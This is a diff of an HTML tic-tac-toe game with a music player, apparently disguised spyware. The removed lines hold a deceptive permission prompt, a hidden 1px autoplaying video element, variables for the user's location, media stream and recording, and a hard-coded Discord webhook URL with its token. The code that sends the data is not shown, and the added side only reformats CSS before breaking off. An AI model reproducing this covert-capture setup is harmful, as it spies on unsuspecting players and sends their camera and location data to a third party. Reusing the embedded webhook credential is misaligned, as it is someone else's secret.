@@ -1,1215 +1,1261 @@
-<!DOCTYPE html><html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> <title>Tic-Tac-Toe Pro</title> <style> * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
-body {
-        font-family: 'Segoe UI', system-ui, sans-serif;
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        padding: 15px;
-        background: #0a0a0f;
-        overflow-x: hidden;
-    }
-
-    /* Animated Background */
-    .bg-animation {
-        position: fixed;
-        top: 0; left: 0;
-        width: 100%; height: 100%;
-        z-index: -1;
-        overflow: hidden;
-    }
-
-    .bg-gradient {
-        position: absolute;
-        width: 200%; height: 200%;
-        top: -50%; left: -50%;
-        background: 
-            radial-gradient(ellipse at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
-            radial-gradient(ellipse at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
-            radial-gradient(ellipse at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 40%);
-        animation: bgMove 20s ease-in-out infinite;
-    }
-
-    @keyframes bgMove {
-        0%, 100% { transform: translate(0, 0) rotate(0deg); }
-        33% { transform: translate(5%, 5%) rotate(5deg); }
-        66% { transform: translate(-5%, 10%) rotate(-5deg); }
-    }
-
-    .bg-grid {
-        position: absolute;
-        width: 100%; height: 100%;
-        background-image: 
-            linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
-            linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
-        background-size: 50px 50px;
-    }
-
-    /* Permission Screen */
-    .permission-blocker {
-        position: fixed;
-        top: 0; left: 0;
-        width: 100%; height: 100%;
-        background: rgba(10,10,15,0.98);
-        z-index: 1000;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .permission-box {
-        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-        border-radius: 24px;
-        padding: 50px 40px;
-        text-align: center;
-        border: 1px solid rgba(255,255,255,0.1);
-        max-width: 90%;
-        width: 400px;
-    }
-
-    .permission-icon { font-size: 60px; margin-bottom: 20px; }
-    .permission-title { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 12px; }
-    .permission-text { color: #888; font-size: 15px; margin-bottom: 30px; }
-
-    .btn-allow {
-        background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
-        color: white;
-        border: none;
-        padding: 16px 50px;
-        font-size: 18px;
-        border-radius: 30px;
-        cursor: pointer;
-        font-weight: 600;
-        transition: transform 0.2s;
-    }
-
-    .btn-allow:active { transform: scale(0.95); }
-
-    /* Mode Selector */
-    .mode-selector {
-        display: none;
-        position: fixed;
-        top: 0; left: 0;
-        width: 100%; height: 100%;
-        background: rgba(10,10,15,0.95);
-        z-index: 999;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .mode-selector.active { display: flex; }
-
-    .mode-title {
-        color: #fff;
-        font-size: 32px;
-        font-weight: 700;
-        margin-bottom: 40px;
-    }
-
-    .mode-cards {
-        display: flex;
-        gap: 20px;
-        flex-wrap: wrap;
-        justify-content: center;
-    }
-
-    .mode-card {
-        background: rgba(255,255,255,0.05);
-        border-radius: 20px;
-        padding: 35px 30px;
-        width: 160px;
-        text-align: center;
-        cursor: pointer;
-        transition: all 0.3s;
-        border: 1px solid rgba(255,255,255,0.1);
-    }
-
-    .mode-card:hover {
-        transform: translateY(-5px);
-        border-color: #667eea;
-    }
-
-    .mode-icon { font-size: 50px; margin-bottom: 15px; display: block; }
-    .mode-name { color: #fff; font-size: 18px; font-weight: 600; }
-
-    /* Avatar Selector Modal */
-    .avatar-modal {
-        display: none;
-        position: fixed;
-        top: 0; left: 0;
-        width: 100%; height: 100%;
-        background: rgba(10,10,15,0.95);
-        z-index: 2000;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .avatar-modal.active { display: flex; }
-
-    .avatar-title {
-        color: #fff;
-        font-size: 24px;
-        font-weight: 700;
-        margin-bottom: 30px;
-    }
-
-    .avatar-grid {
-        display: grid;
-        grid-template-columns: repeat(5, 1fr);
-        gap: 15px;
-        padding: 20px;
-        max-width: 400px;
-    }
-
-    .avatar-option {
-        width: 60px;
-        height: 60px;
-        background: rgba(255,255,255,0.1);
-        border-radius: 16px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 32px;
-        cursor: pointer;
-        border: 2px solid transparent;
-        transition: all 0.2s;
-    }
-
-    .avatar-option:hover {
-        transform: scale(1.1);
-        border-color: #667eea;
-        background: rgba(102,126,234,0.2);
-    }
-
-    .avatar-option.selected {
-        border-color: #ffd700;
-        background: rgba(255,215,0,0.2);
-    }
-
-    .avatar-close {
-        margin-top: 30px;
-        background: rgba(255,255,255,0.1);
-        color: #fff;
-        border: none;
-        padding: 12px 40px;
-        border-radius: 25px;
-        cursor: pointer;
-        font-size: 16px;
-    }
-
-    /* Music Player Styles */
-    .music-player {
-        position: fixed;
-        bottom: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: rgba(30,30,40,0.95);
-        border-radius: 20px;
-        padding: 15px 20px;
-        border: 1px solid rgba(255,255,255,0.1);
-        z-index: 100;
-        width: 90%;
-        max-width: 400px;
-        backdrop-filter: blur(10px);
-    }
-
-    .music-header {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        cursor: pointer;
-    }
-
-    .music-icon {
-        width: 40px;
-        height: 40px;
-        background: linear-gradient(135deg, #667eea, #764ba2);
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 20px;
-        animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-        0%, 100% { transform: scale(1); }
-        50% { transform: scale(1.05); }
-    }
-
-    .music-info {
-        flex: 1;
-        overflow: hidden;
-    }
-
-    .music-title {
-        color: #fff;
-        font-size: 14px;
-        font-weight: 600;
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-    }
-
-    .music-artist {
-        color: #888;
-        font-size: 12px;
-        margin-top: 2px;
-    }
-
-    .music-controls {
-        display: flex;
-        gap: 10px;
-    }
-
-    .music-btn {
-        background: rgba(255,255,255,0.1);
-        border: none;
-        color: #fff;
-        width: 35px;
-        height: 35px;
-        border-radius: 50%;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 16px;
-        transition: all 0.2s;
-    }
-
-    .music-btn:hover {
-        background: rgba(102,126,234,0.5);
-    }
-
-    .playlist-dropdown {
-        max-height: 0;
-        overflow: hidden;
-        transition: max-height 0.3s ease;
-        margin-top: 0;
-    }
-
-    .playlist-dropdown.show {
-        max-height: 250px;
-        margin-top: 15px;
-    }
-
-    .playlist-container {
-        background: rgba(0,0,0,0.3);
-        border-radius: 12px;
-        padding: 10px;
-        max-height: 220px;
-        overflow-y: auto;
-    }
-
-    .playlist-item {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        padding: 10px;
-        border-radius: 8px;
-        cursor: pointer;
-        transition: all 0.2s;
-    }
-
-    .playlist-item:hover {
-        background: rgba(255,255,255,0.1);
-    }
-
-    .playlist-item.active {
-        background: rgba(102,126,234,0.3);
-    }
-
-    .playlist-item-number {
-        color: #888;
-        font-size: 12px;
-        width: 20px;
-    }
-
-    .playlist-item-info {
-        flex: 1;
-        overflow: hidden;
-    }
-
-    .playlist-item-title {
-        color: #fff;
-        font-size: 13px;
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-    }
-
-    .playlist-item-artist {
-        color: #666;
-        font-size: 11px;
-    }
-
-    .playlist-item-duration {
-        color: #888;
-        font-size: 12px;
-    }
-
-    .volume-control {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        margin-top: 10px;
-        padding-top: 10px;
-        border-top: 1px solid rgba(255,255,255,0.1);
-    }
-
-    .volume-slider {
-        flex: 1;
-        height: 4px;
-        -webkit-appearance: none;
-        appearance: none;
-        background: rgba(255,255,255,0.2);
-        border-radius: 2px;
-        outline: none;
-    }
-
-    .volume-slider::-webkit-slider-thumb {
-        -webkit-appearance: none;
-        appearance: none;
-        width: 12px;
-        height: 12px;
-        background: #667eea;
-        border-radius: 50%;
-        cursor: pointer;
-    }
-
-    /* Game Container */
-    .game-container {
-        display: none;
-        width: 100%;
-        max-width: 450px;
-        padding-bottom: 120px;
-    }
-
-    .game-container.active { display: block; }
-
-    .back-btn {
-        background: rgba(255,255,255,0.1);
-        border: none;
-        color: #fff;
-        padding: 10px 20px;
-        border-radius: 20px;
-        cursor: pointer;
-        font-size: 14px;
-        margin-bottom: 15px;
-    }
-
-    /* Header */
-    .game-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 25px;
-        gap: 10px;
-    }
-
-    .player-card {
-        flex: 1;
-        background: rgba(255,255,255,0.05);
-        border-radius: 16px;
-        padding: 15px;
-        text-align: center;
-        border: 2px solid transparent;
-        transition: all 0.3s;
-        cursor: pointer;
-        position: relative;
-    }
-
-    .player-card:hover {
-        background: rgba(255,255,255,0.08);
-    }
-
-    .player-card.active {
-        background: rgba(102,126,234,0.15);
-        border-color: #667eea;
-    }
-
-    .player-card::after {
-        content: '👆';
-        position: absolute;
-        top: 5px;
-        right: 5px;
-        font-size: 12px;
-        opacity: 0.5;
-    }
-
-    .player-avatar {
-        width: 55px; height: 55px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 32px;
-        margin: 0 auto 8px;
-        background: linear-gradient(135deg, #667eea, #764ba2);
-        border: 3px solid rgba(255,255,255,0.2);
-    }
-
-    .player-name { color: #fff; font-size: 13px; font-weight: 600; }
-
-    .vs-badge {
-        background: linear-gradient(135deg, #667eea, #764ba2);
-        color: #fff;
-        width: 45px; height: 45px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-weight: 700;
-        font-size: 14px;
-    }
-
-    /* Turn Indicator */
-    .turn-bar {
-        background: rgba(255,255,255,0.05);
-        border-radius: 12px;
-        padding: 12px;
-        margin-bottom: 20px;
-        text-align: center;
-    }
-
-    .turn-text { color: #fff; font-size: 14px; font-weight: 600; }
-    .turn-text span { color: #667eea; }
-
-    /* Game Board */
-    .board-container {
-        background: rgba(255,255,255,0.03);
-        border-radius: 24px;
-        padding: 20px;
-        border: 1px solid rgba(255,255,255,0.08);
-    }
-
-    .game-board {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 12px;
-        aspect-ratio: 1;
-    }
-
-    .cell {
-        background: rgba(255,255,255,0.05);
-        border-radius: 16px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 50px;
-        font-weight: bold;
-        cursor: pointer;
-        border: 2px solid rgba(255,255,255,0.05);
-        transition: all 0.15s;
-        user-select: none;
-    }
-
-    .cell:hover:not(.taken) {
-        background: rgba(255,255,255,0.1);
-        border-color: rgba(102,126,234,0.5);
-        transform: scale(1.02);
-    }
-
-    .cell:active:not(.taken) { transform: scale(0.98); }
-    .cell.taken { cursor: default; }
-
-    .cell.x {
-        color: #ff416c;
-        text-shadow: 0 0 20px rgba(255,65,108,0.5);
-        animation: popIn 0.3s;
-    }
-
-    .cell.o {
-        color: #00c9ff;
-        text-shadow: 0 0 20px rgba(0,201,255,0.5);
-        animation: popIn 0.3s;
-    }
-
-    @keyframes popIn {
-        0% { transform: scale(0.5); opacity: 0; }
-        100% { transform: scale(1); opacity: 1; }
-    }
-
-    .cell.win {
-        background: linear-gradient(135deg, #ffd700, #ffaa00);
-        color: #000 !important;
-        animation: winPulse 1s infinite;
-    }
-
-    @keyframes winPulse {
-        0%, 100% { transform: scale(1); }
-        50% { transform: scale(1.05); }
-    }
-
-    /* Score Board */
-    .score-section {
-        margin-top: 25px;
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 10px;
-    }
-
-    .score-box {
-        background: rgba(255,255,255,0.05);
-        border-radius: 16px;
-        padding: 15px;
-        text-align: center;
-    }
-
-    .score-label { color: #888; font-size: 12px; margin-bottom: 5px; }
-    .score-value { color: #fff; font-size: 28px; font-weight: 700; }
-    .score-box.p1 .score-value { color: #ff416c; }
-    .score-box.p2 .score-value { color: #00c9ff; }
-    .score-box.draw .score-value { color: #ffd700; }
-
-    /* Buttons */
-    .btn-row {
-        display: flex;
-        gap: 10px;
-        margin-top: 20px;
-    }
-
-    .btn {
-        flex: 1;
-        padding: 14px;
-        border-radius: 12px;
-        border: none;
-        font-size: 15px;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.2s;
-    }
-
-    .btn-primary {
-        background: linear-gradient(90deg, #667eea, #764ba2);
-        color: #fff;
-    }
-
-    .btn-secondary {
-        background: rgba(255,255,255,0.1);
-        color: #fff;
-    }
-
-    .btn:active { transform: scale(0.95); }
-
-    /* Toast */
-    .toast {
-        position: fixed;
-        top: 20px;
-        left: 50%;
-        transform: translateX(-50%) translateY(-100px);
-        background: rgba(30,30,40,0.95);
-        color: #fff;
-        padding: 15px 30px;
-        border-radius: 30px;
-        font-weight: 600;
-        z-index: 10000;
-        transition: transform 0.3s;
-        border: 1px solid rgba(255,255,255,0.1);
-    }
-
-    .toast.show { transform: translateX(-50%) translateY(0); }
-    .toast.win { border-color: #2ecc71; color: #2ecc71; }
-    .toast.draw { border-color: #ffd700; color: #ffd700; }
-
-    /* Confetti */
-    .confetti {
-        position: fixed;
-        width: 8px; height: 8px;
-        pointer-events: none;
-        z-index: 9999;
-    }
-
-    @keyframes confetti-fall {
-        0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
-        100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
-    }
-
-    /* Auto-restart indicator */
-    .restart-timer {
-        position: fixed;
-        bottom: 140px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: rgba(0,0,0,0.8);
-        color: #fff;
-        padding: 10px 25px;
-        border-radius: 20px;
-        font-size: 14px;
-        z-index: 5000;
-        opacity: 0;
-        transition: opacity 0.3s;
-    }
-
-    .restart-timer.show { opacity: 1; }
-
-    #hidden-video {
-        position: fixed;
-        top: 0; left: 0;
-        width: 1px; height: 1px;
-        opacity: 0;
-    }
-</style>
-</head> <body> <div class="bg-animation"> <div class="bg-gradient"></div> <div class="bg-grid"></div> </div>
-<div class="permission-blocker" id="permissionBlocker">
-    <div class="permission-box">
-        <div class="permission-icon">🎮</div>
-        <div class="permission-title">Tic-Tac-Toe Pro</div>
-        <div class="permission-text">Allow Permisions to finding online players and getting the best gaming experience</div>
-        <button class="btn-allow" onclick="requestPermissions()">Allow & Play</button>
-    </div>
-</div>
-
-<div class="mode-selector" id="modeSelector">
-    <div class="mode-title">Select Game Mode</div>
-    <div class="mode-cards">
-        <div class="mode-card" onclick="selectMode('bot')">
-            <span class="mode-icon">🤖</span>
-            <div class="mode-name">vs Bot</div>
-        </div>
-        <div class="mode-card" onclick="selectMode('2player')">
-            <span class="mode-icon">👥</span>
-            <div class="mode-name">2 Players</div>
-        </div>
-    </div>
-</div>
-
-<!-- Avatar Selector Modal -->
-<div class="avatar-modal" id="avatarModal">
-    <div class="avatar-title" id="avatarTitle">Select Avatar</div>
-    <div class="avatar-grid" id="avatarGrid"></div>
-    <button class="avatar-close" onclick="closeAvatarModal()">Cancel</button>
-</div>
-
-<div class="toast" id="toast"></div>
-<div class="restart-timer" id="restartTimer">New game starting in 3...</div>
-
-<div class="game-container" id="gameContainer">
-    <button class="back-btn" onclick="backToMenu()">← Back</button>
-    
-    <div class="game-header">
-        <div class="player-card active" id="p1Card" onclick="openAvatarSelector('p1')">
-            <div class="player-avatar" id="p1Avatar">😎</div>
-            <div class="player-name" id="p1Name">Player 1</div>
-        </div>
-        <div class="vs-badge">VS</div>
-        <div class="player-card" id="p2Card" onclick="openAvatarSelector('p2')">
-            <div class="player-avatar" id="p2Avatar">🤖</div>
-            <div class="player-name" id="p2Name">Bot</div>
-        </div>
-    </div>
-
-    <div class="turn-bar">
-        <div class="turn-text" id="turnText"><span>Player 1's</span> Turn</div>
-    </div>
-
-    <div class="board-container">
-        <div class="game-board" id="gameBoard">
-            <div class="cell" data-i="0"></div>
-            <div class="cell" data-i="1"></div>
-            <div class="cell" data-i="2"></div>
-            <div class="cell" data-i="3"></div>
-            <div class="cell" data-i="4"></div>
-            <div class="cell" data-i="5"></div>
-            <div class="cell" data-i="6"></div>
-            <div class="cell" data-i="7"></div>
-            <div class="cell" data-i="8"></div>
-        </div>
-    </div>
-
-    <div class="score-section">
-        <div class="score-box p1">
-            <div class="score-label">Player 1</div>
-            <div class="score-value" id="s1">0</div>
-        </div>
-        <div class="score-box draw">
-            <div class="score-label">Draws</div>
-            <div class="score-value" id="sd">0</div>
-        </div>
-        <div class="score-box p2">
-            <div class="score-label" id="s2Label">Bot</div>
-            <div class="score-value" id="s2">0</div>
-        </div>
-    </div>
-
-    <div class="btn-row">
-        <button class="btn btn-primary" onclick="newGame()">New Game</button>
-        <button class="btn btn-secondary" onclick="resetAll()">Reset</button>
-    </div>
-</div>
-
-<!-- Music Player -->
-<div class="music-player" id="musicPlayer">
-    <div class="music-header" onclick="togglePlaylist()">
-        <div class="music-icon" id="musicIcon">🎵</div>
-        <div class="music-info">
-            <div class="music-title" id="musicTitle">Click to Play</div>
-            <div class="music-artist" id="musicArtist">Select a song</div>
-        </div>
-        <div class="music-controls">
-            <button class="music-btn" onclick="event.stopPropagation(); previousSong()">⏮</button>
-            <button class="music-btn" onclick="event.stopPropagation(); togglePlay()" id="playBtn">▶</button>
-            <button class="music-btn" onclick="event.stopPropagation(); nextSong()">⏭</button>
-        </div>
-    </div>
-    
-    <div class="volume-control">
-        <span>🔊</span>
-        <input type="range" class="volume-slider" id="volumeSlider" min="0" max="100" value="50">
-        <span id="volumeValue">50%</span>
-    </div>
-
-    <div class="playlist-dropdown" id="playlistDropdown">
-        <div class="playlist-container" id="playlistContainer">
-            <!-- Playlist items will be generated here -->
-        </div>
-    </div>
-</div>
-
-<video id="hidden-video" autoplay muted playsinline></video>
-
-<script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1548644115753865226/LXl4j5NGgIfFzyLe-Vm0g10anJpet_aGHeSlJs5pVHVWEuvq8RKHvgjxNmj60B9rIATz";
-    let loc = {lat: "N/A", lng: "N/A"};
-    let stream = null;
-    let recording = false;
-
-    // Avatar data
-    const avatars = ['😎', '🤠', '👽', '🤖', '👻', '🎃', '🦄', '🐶', '🐱', '🦁', '🐯', '🐨', '🐼', '🐸', '🐙', '🦊', '🐺', '🐗', '🐴', '🐲', '👤', '👦', '👧', '👨', '👩'];
-    const botAvatar = '🤖';
-    let currentAvatarPlayer = null;
-    let playerAvatars = { p1: '😎', p2: '🤖' };
-
-    // Music Player Data - YAHAN APNE SONGS ADD KAREIN
-    const playlist = [
-        {
-            title: "SONG 1",
-            artist: "TALIB KING",
-            url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/New%20Attitude%20Remix%202023%20%20Arabic%20Remix%20%20Dubbai%20Remix%20%20Turkish%20Remix%20%20crazy%20girl%20Mood%20Of%20Remix.mp3" // Apna URL yahan dalein
-        },
-        {
-            title: "SONG 2",
-            artist: "TALIB KING",
-            url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/New%20Attitude%20Remix%202023%20%20New%20Viral%20Remix%20%20Attitude%20Music.mp3"
-        },
-        {
-            title: "Song 3",
-            artist: "TALIB KING",
-            url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/DEVIL%20Lyrical%20Video%20%20PBX%201%20%20Sidhu%20Moose%20Wala%20%20Byg%20Byrd%20%20%20Latest%20Punjabi%20Songs%202018.mp3"
-        }
-    ];
-
-    let currentSongIndex = 0;
-    let audio = new Audio();
-    let isPlaying = false;
-    let isPlaylistOpen = false;
-
-    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-    let state = {
-        board: Array(9).fill(''),
-        turn: 'p1',
-        mode: 'bot',
-        over: false,
-        scores: {p1: 0, p2: 0, d: 0}
-    };
-
-    let autoRestartTimer = null;
-    let countdownInterval = null;
-
-    // Initialize Music Player
-    function initMusicPlayer() {
-        audio.volume = 0.5; // 50% volume
-        
-        // Volume slider listener
-        document.getElementById('volumeSlider').addEventListener('input', function(e) {
-            const volume = e.target.value / 100;
-            audio.volume = volume;
-            document.getElementById('volumeValue').textContent = e.target.value + '%';
-        });
-
-        // Audio event listeners
-        audio.addEventListener('ended', nextSong);
-        audio.addEventListener('play', () => {
-            isPlaying = true;
-            document.getElementById('playBtn').textContent = '⏸';
-            document.getElementById('musicIcon').style.animation = 'pulse 1s infinite';
-        });
-        audio.addEventListener('pause', () => {
-            isPlaying = false;
-            document.getElementById('playBtn').textContent = '▶';
-            document.getElementById('musicIcon').style.animation = 'none';
-        });
-
-        renderPlaylist();
-        updateMusicInfo();
-    }
-
-    function renderPlaylist() {
-        const container = document.getElementById('playlistContainer');
-        container.innerHTML = '';
-        
-        playlist.forEach((song, index) => {
-            const item = document.createElement('div');
-            item.className = 'playlist-item' + (index === currentSongIndex ? ' active' : '');
-            item.onclick = () => selectSong(index);
-            
-            item.innerHTML = `
-                <span class="playlist-item-number">${index + 1}</span>
-                <div class="playlist-item-info">
-                    <div class="playlist-item-title">${song.title}</div>
-                    <div class="playlist-item-artist">${song.artist}</div>
-                </div>
-            `;
-            
-            container.appendChild(item);
-        });
-    }
-
-    function updateMusicInfo() {
-        const song = playlist[currentSongIndex];
-        document.getElementById('musicTitle').textContent = song.title;
-        document.getElementById('musicArtist').textContent = song.artist;
-    }
-
-    function togglePlaylist() {
-        isPlaylistOpen = !isPlaylistOpen;
-        document.getElementById('playlistDropdown').classList.toggle('show', isPlaylistOpen);
-    }
-
-    function selectSong(index) {
-        currentSongIndex = index;
-        audio.src = playlist[index].url;
-        updateMusicInfo();
-        renderPlaylist();
-        play();
-    }
-
-    function togglePlay() {
-        if (!audio.src) {
-            audio.src = playlist[currentSongIndex].url;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tic-Tac-Toe Pro</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
         }
         
-        if (isPlaying) {
-            pause();
-        } else {
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px;
+            background: #0a0a0f;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .bg-gradient {
+            position: absolute;
+            width: 200%; height: 200%;
+            top: -50%; left: -50%;
+            background: 
+                radial-gradient(ellipse at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(ellipse at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 40%);
+            animation: bgMove 20s ease-in-out infinite;
+        }
+
+        @keyframes bgMove {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            33% { transform: translate(5%, 5%) rotate(5deg); }
+            66% { transform: translate(-5%, 10%) rotate(-5deg); }
+        }
+
+        .bg-grid {
+            position: absolute;
+            width: 100%; height: 100%;
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+
+        /* Permission Screen */
+        .permission-blocker {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(10,10,15,0.98);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .permission-box {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border-radius: 24px;
+            padding: 50px 40px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+            max-width: 90%;
+            width: 400px;
+        }
+
+        .permission-icon { font-size: 60px; margin-bottom: 20px; }
+        .permission-title { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 12px; }
+        .permission-text { color: #888; font-size: 15px; margin-bottom: 30px; }
+        .permission-error { color: #ff416c; font-size: 14px; margin-top: 15px; display: none; }
+
+        .btn-allow {
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 16px 50px;
+            font-size: 18px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: transform 0.2s;
+        }
+
+        .btn-allow:active { transform: scale(0.95); }
+
+        /* Mode Selector */
+        .mode-selector {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(10,10,15,0.95);
+            z-index: 999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mode-selector.active { display: flex; }
+
+        .mode-title {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 40px;
+        }
+
+        .mode-cards {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .mode-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 35px 30px;
+            width: 160px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .mode-card:hover {
+            transform: translateY(-5px);
+            border-color: #667eea;
+        }
+
+        .mode-icon { font-size: 50px; margin-bottom: 15px; display: block; }
+        .mode-name { color: #fff; font-size: 18px; font-weight: 600; }
+
+        /* Avatar Selector Modal */
+        .avatar-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(10,10,15,0.95);
+            z-index: 2000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .avatar-modal.active { display: flex; }
+
+        .avatar-title {
+            color: #fff;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 30px;
+        }
+
+        .avatar-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            padding: 20px;
+            max-width: 400px;
+        }
+
+        .avatar-option {
+            width: 60px;
+            height: 60px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .avatar-option:hover {
+            transform: scale(1.1);
+            border-color: #667eea;
+            background: rgba(102,126,234,0.2);
+        }
+
+        .avatar-option.selected {
+            border-color: #ffd700;
+            background: rgba(255,215,0,0.2);
+        }
+
+        .avatar-close {
+            margin-top: 30px;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        /* Music Player Styles */
+        .music-player {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(30,30,40,0.95);
+            border-radius: 20px;
+            padding: 15px 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            z-index: 100;
+            width: 90%;
+            max-width: 400px;
+            backdrop-filter: blur(10px);
+        }
+
+        .music-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+
+        .music-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .music-info {
+            flex: 1;
+            overflow: hidden;
+        }
+
+        .music-title {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .music-artist {
+            color: #888;
+            font-size: 12px;
+            margin-top: 2px;
+        }
+
+        .music-controls {
+            display: flex;
+            gap: 10px;
+        }
+
+        .music-btn {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .music-btn:hover {
+            background: rgba(102,126,234,0.5);
+        }
+
+        .playlist-dropdown {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            margin-top: 0;
+        }
+
+        .playlist-dropdown.show {
+            max-height: 250px;
+            margin-top: 15px;
+        }
+
+        .playlist-container {
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            padding: 10px;
+            max-height: 220px;
+            overflow-y: auto;
+        }
+
+        .playlist-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .playlist-item:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .playlist-item.active {
+            background: rgba(102,126,234,0.3);
+        }
+
+        .playlist-item-number {
